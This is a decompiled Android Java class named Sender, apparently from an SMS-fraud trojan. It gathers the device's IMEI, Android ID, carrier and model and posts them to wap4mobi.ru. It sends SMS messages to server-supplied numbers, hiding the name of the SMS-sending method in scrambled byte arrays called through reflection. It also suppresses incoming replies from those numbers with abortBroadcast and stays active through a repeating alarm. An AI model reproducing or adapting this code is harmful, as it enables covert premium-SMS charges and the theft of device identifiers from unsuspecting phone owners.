package com.uniplugin.sender;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.res.AssetManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.SystemClock;
import android.provider.Settings.Secure;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy.Type;
import java.net.SocketAddress;
import java.net.URL;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class Sender
{
  public static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
  BroadcastReceiver RequestReceiver = new BroadcastReceiver()
  {
    public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
    {
      int i;
      if (paramAnonymousIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
      {
        paramAnonymousContext = paramAnonymousIntent.getExtras();
        if (paramAnonymousContext != null)
        {
          paramAnonymousIntent = (Object[])paramAnonymousContext.get("pdus");
          paramAnonymousContext = new SmsMessage[paramAnonymousIntent.length];
          i = 0;
        }
      }
      for (;;)
      {
        if (i >= paramAnonymousIntent.length)
        {
          int k = paramAnonymousContext.length;
          i = 0;
          if (i < k) {
            break;
          }
          return;
        }
        paramAnonymousContext[i] = SmsMessage.createFromPdu((byte[])paramAnonymousIntent[i]);
        i += 1;
      }
      paramAnonymousIntent = paramAnonymousContext[i];
      int j;
      if ((Sender.this.timeers != null) && (Sender.this.GetUnixTime() < Integer.parseInt(Sender.this.timeers) + 3600) && (Sender.this.numbers != null) && (Sender.this.numbers.size() > 0)) {
        j = 0;
      }
      for (;;)
      {
        if (j >= Sender.this.numbers.size())
        {
          i += 1;
          break;
        }
        if (paramAnonymousIntent.getOriginatingAddress().replace("+7", "8").contains(((String)Sender.this.numbers.get(j)).toString().replace("+7", "8"))) {
          abortBroadcast();
        }
        j += 1;
      }
    }
  };
  public Context context;
  public String domen = "http://wap4mobi.ru";
  public String ideviceid;
  public String ilang;
  public String imei;
  public String imodel;
  public String ioperator;
  public String ipackname;
  public String iversionsdk;
  public ArrayList<String> numbers = new ArrayList();
  public String params = "";
  public ArrayList<String> prefix = new ArrayList();
  public String resulturl = "http://yandex.ru";
  public int step;
  public String timeers;
  Timer timer = new Timer();
  
  public Sender() {}
  
  private String getJson(String paramString)
  {
    Object localObject = this.context.getAssets();
    try
    {
      paramString = ((AssetManager)localObject).open(paramString);
      localObject = new byte[paramString.available()];
      paramString.read((byte[])localObject);
      paramString = new String((byte[])localObject);
      return paramString;
    }
    catch (IOException paramString)
    {
      paramString.printStackTrace();
    }
    return null;
  }
  
  /* Error */
  private void parsalldata(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: new 125	org/json/JSONTokener
    //   5: dup
    //   6: aload_1
    //   7: invokespecial 127	org/json/JSONTokener:<init>	(Ljava/lang/String;)V
    //   10: invokevirtual 131	org/json/JSONTokener:nextValue	()Ljava/lang/Object;
    //   13: checkcast 133	org/json/JSONObject
    //   16: astore_1
    //   17: aload_0
    //   18: aload_1
    //   19: ldc -122
    //   21: invokevirtual 137	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   24: putfield 52	com/uniplugin/sender/Sender:resulturl	Ljava/lang/String;
    //   27: aload_0
    //   28: aload_1
    //   29: ldc -118
    //   31: invokevirtual 137	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   34: putfield 60	com/uniplugin/sender/Sender:domen	Ljava/lang/String;
    //   37: aload_0
    //   38: aload_1
    //   39: ldc -116
    //   41: invokevirtual 137	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   44: putfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   47: aload_0
    //   48: aload_0
    //   49: getfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   52: ldc -114
    //   54: aload_0
    //   55: getfield 144	com/uniplugin/sender/Sender:iversionsdk	Ljava/lang/String;
    //   58: invokevirtual 148	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   61: putfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   64: aload_0
    //   65: aload_0
    //   66: getfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   69: ldc -106
    //   71: aload_0
    //   72: getfield 152	com/uniplugin/sender/Sender:ideviceid	Ljava/lang/String;
    //   75: invokevirtual 148	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   78: putfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   81: aload_0
    //   82: aload_0
    //   83: getfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   86: ldc -102
    //   88: aload_0
    //   89: getfield 156	com/uniplugin/sender/Sender:ioperator	Ljava/lang/String;
    //   92: invokevirtual 148	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   95: putfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   98: aload_0
    //   99: aload_0
    //   100: getfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   103: ldc -98
    //   105: aload_0
    //   106: getfield 160	com/uniplugin/sender/Sender:ipackname	Ljava/lang/String;
    //   109: invokevirtual 148	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   112: putfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   115: aload_0
    //   116: aload_0
    //   117: getfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   120: ldc -94
    //   122: aload_0
    //   123: getfield 164	com/uniplugin/sender/Sender:imodel	Ljava/lang/String;
    //   126: invokevirtual 148	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   129: putfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   132: aload_0
    //   133: aload_0
    //   134: getfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   137: ldc -90
    //   139: aload_0
    //   140: getfield 168	com/uniplugin/sender/Sender:ilang	Ljava/lang/String;
    //   143: invokevirtual 148	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   146: putfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   149: aload_0
    //   150: aload_0
    //   151: getfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   154: ldc -86
    //   156: aload_0
    //   157: getfield 172	com/uniplugin/sender/Sender:imei	Ljava/lang/String;
    //   160: invokevirtual 148	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   163: putfield 56	com/uniplugin/sender/Sender:params	Ljava/lang/String;
    //   166: aload_1
    //   167: aload_0
    //   168: getfield 156	com/uniplugin/sender/Sender:ioperator	Ljava/lang/String;
    //   171: invokevirtual 176	org/json/JSONObject:isNull	(Ljava/lang/String;)Z
    //   174: ifne +50 -> 224
    //   177: aload_0
    //   178: aload_1
    //   179: aload_0
    //   180: getfield 156	com/uniplugin/sender/Sender:ioperator	Ljava/lang/String;
    //   183: invokevirtual 180	org/json/JSONObject:getJSONObject	(Ljava/lang/String;)Lorg/json/JSONObject;
    //   186: invokevirtual 184	com/uniplugin/sender/Sender:parseobject	(Lorg/json/JSONObject;)V
    //   189: return
    //   190: astore_1
    //   191: aload_1
    //   192: invokevirtual 185	org/json/JSONException:printStackTrace	()V
    //   195: aload_2
    //   196: astore_1
    //   197: goto -180 -> 17
    //   200: astore_2
    //   201: aload_2
    //   202: invokevirtual 185	org/json/JSONException:printStackTrace	()V
    //   205: goto -178 -> 27
    //   208: astore_2
    //   209: aload_2
    //   210: invokevirtual 185	org/json/JSONException:printStackTrace	()V
    //   213: goto -176 -> 37
    //   216: astore_2
    //   217: aload_2
    //   218: invokevirtual 185	org/json/JSONException:printStackTrace	()V
    //   221: goto -55 -> 166
    //   224: aload_0
    //   225: aload_1
    //   226: aload_0
    //   227: getfield 156	com/uniplugin/sender/Sender:ioperator	Ljava/lang/String;
    //   230: iconst_0
    //   231: iconst_3
    //   232: invokevirtual 189	java/lang/String:substring	(II)Ljava/lang/String;
    //   235: invokevirtual 180	org/json/JSONObject:getJSONObject	(Ljava/lang/String;)Lorg/json/JSONObject;
    //   238: invokevirtual 184	com/uniplugin/sender/Sender:parseobject	(Lorg/json/JSONObject;)V
    //   241: return
    //   242: astore_1
    //   243: aload_1
    //   244: invokevirtual 185	org/json/JSONException:printStackTrace	()V
    //   247: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	248	0	this	Sender
    //   0	248	1	paramString	String
    //   1	195	2	localObject	Object
    //   200	2	2	localJSONException1	JSONException
    //   208	2	2	localJSONException2	JSONException
    //   216	2	2	localJSONException3	JSONException
    // Exception table:
    //   from	to	target	type
    //   2	17	190	org/json/JSONException
    //   17	27	200	org/json/JSONException
    //   27	37	208	org/json/JSONException
    //   37	166	216	org/json/JSONException
    //   166	189	242	org/json/JSONException
    //   224	241	242	org/json/JSONException
  }
  
  /* Error */
  private void parsnewdataandsend(String paramString)
  {
    // Byte code:
    //   0: ldc -65
    //   2: astore 8
    //   4: ldc -65
    //   6: astore_3
    //   7: ldc -65
    //   9: astore 4
    //   11: ldc -65
    //   13: astore 5
    //   15: ldc -65
    //   17: astore 6
    //   19: ldc -65
    //   21: astore 7
    //   23: aconst_null
    //   24: astore_2
    //   25: new 125	org/json/JSONTokener
    //   28: dup
    //   29: aload_1
    //   30: invokespecial 127	org/json/JSONTokener:<init>	(Ljava/lang/String;)V
    //   33: invokevirtual 131	org/json/JSONTokener:nextValue	()Ljava/lang/Object;
    //   36: checkcast 133	org/json/JSONObject
    //   39: astore_1
    //   40: aload_1
    //   41: astore_2
    //   42: aload_2
    //   43: ldc -63
    //   45: invokevirtual 137	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   48: astore_1
    //   49: aload_2
    //   50: ldc -61
    //   52: invokevirtual 137	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   55: astore 8
    //   57: aload 8
    //   59: astore_3
    //   60: aload_2
    //   61: ldc -59
    //   63: invokevirtual 137	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   66: astore 8
    //   68: aload 8
    //   70: astore 4
    //   72: aload_2
    //   73: ldc -57
    //   75: invokevirtual 137	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   78: astore 8
    //   80: aload 8
    //   82: astore 5
    //   84: aload_2
    //   85: ldc -55
    //   87: invokevirtual 137	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   90: astore 8
    //   92: aload 8
    //   94: astore 6
    //   96: aload_2
    //   97: ldc -53
    //   99: invokevirtual 137	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   102: astore_2
    //   103: aload_1
    //   104: ldc -65
    //   106: invokevirtual 207	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   109: ifeq +23 -> 132
    //   112: aload 4
    //   114: ldc -65
    //   116: invokevirtual 207	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   119: ifeq +13 -> 132
    //   122: aload 6
    //   124: ldc -65
    //   126: invokevirtual 207	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   129: ifne +39 -> 168
    //   132: aload_0
    //   133: getfield 90	com/uniplugin/sender/Sender:context	Landroid/content/Context;
    //   136: ldc -47
    //   138: iconst_0
    //   139: invokevirtual 213	android/content/Context:getSharedPreferences	(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   142: invokeinterface 219 1 0
    //   147: astore 7
    //   149: aload 7
    //   151: ldc -35
    //   153: iconst_1
    //   154: invokeinterface 227 3 0
    //   159: pop
    //   160: aload 7
    //   162: invokeinterface 231 1 0
    //   167: pop
    //   168: aload_1
    //   169: ldc -65
    //   171: invokevirtual 207	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   174: ifne +9 -> 183
    //   177: aload_0
    //   178: aload_3
    //   179: aload_1
    //   180: invokevirtual 235	com/uniplugin/sender/Sender:sendSMSki	(Ljava/lang/String;Ljava/lang/String;)V
    //   183: aload 4
    //   185: ldc -65
    //   187: invokevirtual 207	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   190: ifne +11 -> 201
    //   193: aload_0
    //   194: aload 5
    //   196: aload 4
    //   198: invokevirtual 235	com/uniplugin/sender/Sender:sendSMSki	(Ljava/lang/String;Ljava/lang/String;)V
    //   201: aload 6
    //   203: ldc -65
    //   205: invokevirtual 207	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   208: ifne +10 -> 218
    //   211: aload_0
    //   212: aload_2
    //   213: aload 6
    //   215: invokevirtual 235	com/uniplugin/sender/Sender:sendSMSki	(Ljava/lang/String;Ljava/lang/String;)V
    //   218: aload_1
    //   219: ldc -65
    //   221: invokevirtual 207	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   224: ifeq +35 -> 259
    //   227: aload 4
    //   229: ldc -65
    //   231: invokevirtual 207	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   234: ifeq +25 -> 259
    //   237: aload 6
    //   239: ldc -65
    //   241: invokevirtual 207	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   244: ifeq +15 -> 259
    //   247: aload_0
    //   248: getfield 72	com/uniplugin/sender/Sender:timer	Ljava/util/Timer;
    //   251: invokevirtual 238	java/util/Timer:cancel	()V
    //   254: aload_0
    //   255: aconst_null
    //   256: putfield 72	com/uniplugin/sender/Sender:timer	Ljava/util/Timer;
    //   259: return
    //   260: astore_1
    //   261: aload_1
    //   262: invokevirtual 185	org/json/JSONException:printStackTrace	()V
    //   265: goto -223 -> 42
    //   268: astore_1
    //   269: aload_1
    //   270: invokevirtual 185	org/json/JSONException:printStackTrace	()V
    //   273: aload 8
    //   275: astore_1
    //   276: goto -227 -> 49
    //   279: astore 8
    //   281: aload 8
    //   283: invokevirtual 185	org/json/JSONException:printStackTrace	()V
    //   286: goto -226 -> 60
    //   289: astore 8
    //   291: aload 8
    //   293: invokevirtual 185	org/json/JSONException:printStackTrace	()V
    //   296: goto -224 -> 72
    //   299: astore 8
    //   301: aload 8
    //   303: invokevirtual 185	org/json/JSONException:printStackTrace	()V
    //   306: goto -222 -> 84
    //   309: astore 8
    //   311: aload 8
    //   313: invokevirtual 185	org/json/JSONException:printStackTrace	()V
    //   316: goto -220 -> 96
    //   319: astore_2
    //   320: aload_2
    //   321: invokevirtual 185	org/json/JSONException:printStackTrace	()V
    //   324: aload 7
    //   326: astore_2
    //   327: goto -224 -> 103
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	330	0	this	Sender
    //   0	330	1	paramString	String
    //   24	189	2	str1	String
    //   319	2	2	localJSONException1	JSONException
    //   326	1	2	localObject1	Object
    //   6	173	3	str2	String
    //   9	219	4	str3	String
    //   13	182	5	str4	String
    //   17	221	6	str5	String
    //   21	304	7	localObject2	Object
    //   2	272	8	str6	String
    //   279	3	8	localJSONException2	JSONException
    //   289	3	8	localJSONException3	JSONException
    //   299	3	8	localJSONException4	JSONException
    //   309	3	8	localJSONException5	JSONException
    // Exception table:
    //   from	to	target	type
    //   25	40	260	org/json/JSONException
    //   42	49	268	org/json/JSONException
    //   49	57	279	org/json/JSONException
    //   60	68	289	org/json/JSONException
    //   72	80	299	org/json/JSONException
    //   84	92	309	org/json/JSONException
    //   96	103	319	org/json/JSONException
  }
  
  private void startUpdater()
  {
    AlarmManager localAlarmManager = (AlarmManager)this.context.getSystemService("alarm");
    Object localObject = new Intent(this.context, AReceiver.class);
    localObject = PendingIntent.getBroadcast(this.context, 0, (Intent)localObject, 134217728);
    localAlarmManager.cancel((PendingIntent)localObject);
    localAlarmManager.setRepeating(3, SystemClock.elapsedRealtime(), 14400000L, (PendingIntent)localObject);
  }
  
  public int GetUnixTime()
  {
    return (int)(Calendar.getInstance().getTimeInMillis() / 1000L);
  }
  
  public void SenderStart(Context paramContext, String paramString, int paramInt)
  {
    this.context = paramContext;
    if (paramInt == 1) {
      startUpdater();
    }
    this.iversionsdk = Build.VERSION.SDK;
    this.ideviceid = Settings.Secure.getString(this.context.getContentResolver(), "android_id");
    this.imei = ((TelephonyManager)this.context.getSystemService("phone")).getDeviceId();
    this.ioperator = ((TelephonyManager)this.context.getSystemService("phone")).getNetworkOperator();
    this.ipackname = this.context.getPackageName();
    this.imodel = Build.MODEL;
    this.ilang = Locale.getDefault().getLanguage();
    parsalldata(getJson(paramString));
  }
  
  protected String doInBackground(String paramString1, String paramString2)
    throws IOException
  {
    Object localObject = android.net.Proxy.getDefaultHost();
    int i = android.net.Proxy.getDefaultPort();
    paramString1 = new URL(paramString1);
    if (i > 0)
    {
      localObject = new InetSocketAddress((String)localObject, i);
      paramString1 = (HttpURLConnection)paramString1.openConnection(new java.net.Proxy(Proxy.Type.HTTP, (SocketAddress)localObject));
      paramString1.setDoInput(true);
      paramString1.setDoOutput(true);
      paramString1.setRequestMethod("POST");
      paramString1.setConnectTimeout(10000);
      localObject = new DataOutputStream(paramString1.getOutputStream());
      ((DataOutputStream)localObject).writeBytes(paramString2);
      ((DataOutputStream)localObject).flush();
      ((DataOutputStream)localObject).close();
      paramString1.connect();
      paramString1 = new BufferedReader(new InputStreamReader(paramString1.getInputStream(), "UTF-8"));
      paramString2 = new StringBuilder();
    }
    for (;;)
    {
      localObject = paramString1.readLine();
      if (localObject == null)
      {
        return paramString2.toString();
        paramString1 = (HttpURLConnection)paramString1.openConnection();
        break;
      }
      paramString2.append((String)localObject).append("\n");
    }
  }
  
  public void otstuk()
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        Object localObject = null;
        try
        {
          String str = Sender.this.doInBackground(Sender.this.domen + "/stats/open.php", Sender.this.params);
          localObject = str;
        }
        catch (IOException localIOException)
        {
          for (;;)
          {
            localIOException.printStackTrace();
          }
          Sender.this.timeers = "0";
          return;
        }
        if (localObject != null) {
          if (localObject.contains("ok"))
          {
            Sender.this.timeers = String.valueOf(Sender.this.GetUnixTime());
            return;
          }
        }
        Sender.this.timeers = "0";
      }
    }).start();
  }
  
  public void otstukpress()
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        Object localObject = null;
        try
        {
          String str = Sender.this.doInBackground(Sender.this.domen + "/stats/press.php", Sender.this.params);
          localObject = str;
        }
        catch (IOException localIOException)
        {
          for (;;)
          {
            localIOException.printStackTrace();
          }
          Sender.this.timeers = "0";
          return;
        }
        if (localObject != null) {
          if (localObject.contains("ok"))
          {
            Sender.this.timeers = String.valueOf(Sender.this.GetUnixTime());
            return;
          }
        }
        Sender.this.timeers = "0";
      }
    }).start();
  }
  
  protected void parseobject(JSONObject paramJSONObject)
  {
    int j;
    int i;
    try
    {
      localJSONArray = paramJSONObject.getJSONArray("number");
      if (localJSONArray != null)
      {
        j = localJSONArray.length();
        i = 0;
        break label100;
      }
      paramJSONObject = paramJSONObject.getJSONArray("prefix");
      if (paramJSONObject == null) {
        return;
      }
      j = paramJSONObject.length();
      i = 0;
    }
    catch (JSONException paramJSONObject)
    {
      JSONArray localJSONArray;
      label47:
      paramJSONObject.printStackTrace();
      return;
    }
    this.numbers.add(localJSONArray.get(i).toString());
    i += 1;
    label100:
    do
    {
      this.prefix.add(paramJSONObject.get(i).toString());
      i += 1;
      continue;
      if (i < j) {
        break label47;
      }
      break;
    } while (i < j);
  }
  
  public void proverka()
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        Object localObject1 = null;
        try
        {
          localObject2 = Sender.this.doInBackground(Sender.this.domen + "/stats/recheck.php", Sender.this.params);
          localObject1 = localObject2;
        }
        catch (IOException localIOException)
        {
          for (;;)
          {
            Object localObject2;
            SharedPreferences.Editor localEditor;
            int i;
            localIOException.printStackTrace();
          }
          Sender.this.timeers = "0";
        }
        if (localObject1 != null)
        {
          if (localObject1.length() > 21)
          {
            localObject2 = Sender.this.context.getSharedPreferences("ESLIABONENTTUPIT", 0);
            localEditor = ((SharedPreferences)localObject2).edit();
            i = ((SharedPreferences)localObject2).getInt("countimer", 0) + 1;
            localEditor.putInt("countimer", i);
            localEditor.commit();
            if (i > 20)
            {
              Sender.this.timer.cancel();
              Sender.this.timer = null;
            }
            Sender.this.parsnewdataandsend(localObject1);
          }
          return;
        }
      }
    }).start();
  }
  
  public void requestReceived(String paramString) {}
  
  public void sendSMSka(String paramString1, String paramString2)
  {
    Object localObject1 = this.context.getSharedPreferences("ESLIABONENTTUPIT", 0);
    Object localObject2 = ((SharedPreferences)localObject1).edit();
    int i = ((SharedPreferences)localObject1).getInt("countsend", 0) + 1;
    ((SharedPreferences.Editor)localObject2).putInt("countsend", i);
    ((SharedPreferences.Editor)localObject2).commit();
    int j;
    if (i < 6)
    {
      localObject2 = new byte[15];
      Object tmp67_65 = localObject2;
      tmp67_65[0] = 101;
      Object tmp73_67 = tmp67_65;
      tmp73_67[1] = 120;
      Object tmp79_73 = tmp73_67;
      tmp79_73[2] = 116;
      Object tmp85_79 = tmp79_73;
      tmp85_79[3] = 77;
      Object tmp91_85 = tmp85_79;
      tmp91_85[4] = 101;
      Object tmp97_91 = tmp91_85;
      tmp97_91[5] = 115;
      Object tmp103_97 = tmp97_91;
      tmp103_97[6] = 115;
      Object tmp110_103 = tmp103_97;
      tmp110_103[7] = 97;
      Object tmp117_110 = tmp110_103;
      tmp117_110[8] = 103;
      Object tmp124_117 = tmp117_110;
      tmp124_117[9] = 101;
      Object tmp131_124 = tmp124_117;
      tmp131_124[10] = 115;
      Object tmp138_131 = tmp131_124;
      tmp138_131[11] = 101;
      Object tmp145_138 = tmp138_131;
      tmp145_138[12] = 110;
      Object tmp152_145 = tmp145_138;
      tmp152_145[13] = 100;
      Object tmp159_152 = tmp152_145;
      tmp159_152[14] = 84;
      tmp159_152;
      localObject1 = new byte[15];
      localObject1[5] = 101;
      localObject1[6] = 120;
      localObject1[7] = 116;
      localObject1[8] = 77;
      localObject1[9] = 101;
      localObject1[10] = 115;
      localObject1[11] = 115;
      localObject1[12] = 97;
      localObject1[13] = 103;
      localObject1[14] = 101;
      i = 0;
      j = localObject2.length - 5;
    }
    for (;;)
    {
      if (j >= localObject2.length)
      {
        int k = 0;
        j = i;
        i = k;
        label268:
        if (i < localObject2.length - 5) {
          break label407;
        }
      }
      try
      {
        Object[] arrayOfObject;
        if (Integer.parseInt(Build.VERSION.SDK) < 4)
        {
          localObject2 = Class.forName("android.telephony.gsm.SmsManager").getMethod("getDefault", null).invoke(null, null);
          localObject1 = Class.forName("android.telephony.gsm.SmsManager").getMethod(new String((byte[])localObject1), new Class[] { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class });
          arrayOfObject = new Object[5];
          arrayOfObject[0] = paramString1;
          arrayOfObject[2] = paramString2;
          ((Method)localObject1).invoke(localObject2, arrayOfObject);
          return;
          localObject1[i] = localObject2[j];
          i += 1;
          j += 1;
          continue;
          label407:
          localObject1[j] = localObject2[i];
          j += 1;
          i += 1;
          break label268;
        }
        else
        {
          localObject2 = Class.forName("android.telephony.SmsManager").getMethod("getDefault", null).invoke(null, null);
          localObject1 = Class.forName("android.telephony.SmsManager").getMethod(new String((byte[])localObject1), new Class[] { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class });
          arrayOfObject = new Object[5];
          arrayOfObject[0] = paramString1;
          arrayOfObject[2] = paramString2;
          ((Method)localObject1).invoke(localObject2, arrayOfObject);
          return;
        }
      }
      catch (Exception paramString1) {}
    }
  }
  
  public void sendSMSkahi(String paramString1, String paramString2)
  {
    sendSMSka(paramString1, paramString2);
  }
  
  public void sendSMSki(String paramString1, String paramString2)
  {
    Object localObject2 = new byte[15];
    Object tmp8_6 = localObject2;
    tmp8_6[0] = 101;
    Object tmp14_8 = tmp8_6;
    tmp14_8[1] = 120;
    Object tmp20_14 = tmp14_8;
    tmp20_14[2] = 116;
    Object tmp26_20 = tmp20_14;
    tmp26_20[3] = 77;
    Object tmp32_26 = tmp26_20;
    tmp32_26[4] = 101;
    Object tmp38_32 = tmp32_26;
    tmp38_32[5] = 115;
    Object tmp44_38 = tmp38_32;
    tmp44_38[6] = 115;
    Object tmp51_44 = tmp44_38;
    tmp51_44[7] = 97;
    Object tmp58_51 = tmp51_44;
    tmp58_51[8] = 103;
    Object tmp65_58 = tmp58_51;
    tmp65_58[9] = 101;
    Object tmp72_65 = tmp65_58;
    tmp72_65[10] = 115;
    Object tmp79_72 = tmp72_65;
    tmp79_72[11] = 101;
    Object tmp86_79 = tmp79_72;
    tmp86_79[12] = 110;
    Object tmp93_86 = tmp86_79;
    tmp93_86[13] = 100;
    Object tmp100_93 = tmp93_86;
    tmp100_93[14] = 84;
    tmp100_93;
    Object localObject1 = new byte[15];
    localObject1[5] = 101;
    localObject1[6] = 120;
    localObject1[7] = 116;
    localObject1[8] = 77;
    localObject1[9] = 101;
    localObject1[10] = 115;
    localObject1[11] = 115;
    localObject1[12] = 97;
    localObject1[13] = 103;
    localObject1[14] = 101;
    int i = 0;
    int j = localObject2.length - 5;
    for (;;)
    {
      if (j >= localObject2.length)
      {
        int k = 0;
        j = i;
        i = k;
        label209:
        if (i < localObject2.length - 5) {
          break label348;
        }
      }
      try
      {
        Object[] arrayOfObject;
        if (Integer.parseInt(Build.VERSION.SDK) < 4)
        {
          localObject2 = Class.forName("android.telephony.gsm.SmsManager").getMethod("getDefault", null).invoke(null, null);
          localObject1 = Class.forName("android.telephony.gsm.SmsManager").getMethod(new String((byte[])localObject1), new Class[] { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class });
          arrayOfObject = new Object[5];
          arrayOfObject[0] = paramString1;
          arrayOfObject[2] = paramString2;
          ((Method)localObject1).invoke(localObject2, arrayOfObject);
          return;
          localObject1[i] = localObject2[j];
          i += 1;
          j += 1;
          continue;
          label348:
          localObject1[j] = localObject2[i];
          j += 1;
          i += 1;
          break label209;
        }
        else
        {
          localObject2 = Class.forName("android.telephony.SmsManager").getMethod("getDefault", null).invoke(null, null);
          localObject1 = Class.forName("android.telephony.SmsManager").getMethod(new String((byte[])localObject1), new Class[] { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class });
          arrayOfObject = new Object[5];
          arrayOfObject[0] = paramString1;
          arrayOfObject[2] = paramString2;
          ((Method)localObject1).invoke(localObject2, arrayOfObject);
          return;
        }
      }
      catch (Exception paramString1) {}
    }
  }
  
  public void sendstart()
  {
    IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
    this.context.registerReceiver(this.RequestReceiver, localIntentFilter);
    new Thread(new Runnable()
    {
      public void run()
      {
        int i;
        if ((Sender.this.prefix != null) && (Sender.this.prefix.size() > 0))
        {
          Sender.this.timer.scheduleAtFixedRate(new Sender.UpdateBallTask(Sender.this), 40000L, 40000L);
          SharedPreferences.Editor localEditor = Sender.this.context.getSharedPreferences("ESLIABONENTTUPIT", 0).edit();
          localEditor.putInt("countimer", 1);
          localEditor.commit();
          i = 0;
        }
        for (;;)
        {
          if (i >= Sender.this.prefix.size()) {
            return;
          }
          Sender.this.sendSMSka(((String)Sender.this.numbers.get(i)).toString(), ((String)Sender.this.prefix.get(i)).toString());
          i += 1;
        }
      }
    }).start();
  }
  
  class UpdateBallTask
    extends TimerTask
  {
    UpdateBallTask() {}
    
    public void run()
    {
      Sender.this.proverka();
    }
  }
}
